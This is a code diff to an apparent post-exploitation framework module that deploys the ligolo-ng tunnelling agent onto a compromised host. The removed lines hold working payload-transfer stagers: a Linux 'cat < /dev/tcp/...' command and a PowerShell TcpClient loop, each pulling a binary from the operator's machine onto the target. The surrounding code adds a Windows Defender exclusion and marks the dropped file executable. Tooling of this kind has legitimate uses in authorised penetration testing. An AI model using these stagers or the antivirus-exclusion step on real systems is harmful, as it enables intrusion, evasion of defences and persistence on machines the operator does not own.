@@ -3,14 +3,12 @@ from __future__ import annotations
 import io
 import json
 import re
-import select
 import tarfile
 import time
 import urllib.request
 import zipfile
 
 from koi.modules.blueprint import KoiModule
-from koi.utils.tcp import spawn_send_server
 
 _GITHUB_API = "https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"
 
@@ -111,55 +109,6 @@ class LigoloModule(KoiModule):
                     raise RuntimeError("Could not read agent from archive")
                 return f.read()
 
-    def _upload_bytes(self, raw: bytes, dest: str) -> bool:
-        """Upload *raw* bytes to *dest* on the target via a side TCP connection."""
-        local_ip = self._get_local_ip()
-        transfer_timeout = max(60, len(raw) // 50_000 + 30)
-        bar = self.ui.ProgressBar(total=len(raw))
-        port, t, errors = spawn_send_server(raw, timeout=transfer_timeout, on_progress=lambda sent: bar.update(sent))
-
-        if self.session.os_type == "linux":
-            self.exec(
-                f"cat < /dev/tcp/{local_ip}/{port} > {dest}",
-                timeout=transfer_timeout,
-            )
-        else:
-            ps_cmd = (
-                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-                f"$_s=$_c.GetStream();"
-                f"$_f=[IO.File]::OpenWrite('{dest}');"
-                f"$_b=New-Object byte[] 65536;"
-                f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
-                f"$_f.Close();$_c.Close()"
-            )
-            if self.session.upgraded:
-                self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-                time.sleep(0.3)
-                r, _, _ = select.select([self.session.conn], [], [], 1.0)
-                if r:
-                    self.session.conn.recv(4096)
-            else:
-                self.sendline(ps_cmd)
-
-        t.join(timeout=transfer_timeout)
-        bar.done()
-        print()
-
-        if errors:
-            return False
-
-        time.sleep(1.5)
-
-        if self.session.os_type == "linux":
-            result = self.exec(f"test -s {dest} && echo OK || echo MISS")
-            if "OK" not in result.stdout:
-                return False
-            self.exec(f"chmod +x {dest}")
-            return True
-        else:
-            check = self._win_query(f"(Test-Path '{dest}').ToString()")
-            return check.strip().lower() == "true"
-
     def run(self) -> None:
         os_type = self.session.os_type
 
@@ -218,11 +167,29 @@ class LigoloModule(KoiModule):
             self.status(f"Defender exclusion added for {dest_dir}")
 
         self.status(f"Uploading to {dest}…")
-        ok = self._upload_bytes(agent_bytes, dest)
+        transfer_timeout = max(60, len(agent_bytes) // 50_000 + 30)
+        bar = self.ui.ProgressBar(total=len(agent_bytes))
+        ok = self._upload_bytes(agent_bytes, dest, timeout=transfer_timeout, on_progress=bar.update)
+        bar.done()
+        print()
 
         if not ok:
             self.err("Upload failed or file not present on target after transfer.")
             return
+
+        time.sleep(1.5)
+
+        if os_name == "linux":
+            result = self.exec(f"test -s {dest} && echo OK || echo MISS")
+            if "OK" not in result.stdout:
+                self.err("Upload failed or file not present on target after transfer.")
+                return
+            self.exec(f"chmod +x {dest}")
+        else:
+            check = self._win_query(f"(Test-Path '{dest}').ToString()")
+            if check.strip().lower() != "true":
+                self.err("Upload failed or file not present on target after transfer.")
+                return
 
         print()
         self.box("ligolo-ng agent deployed", {
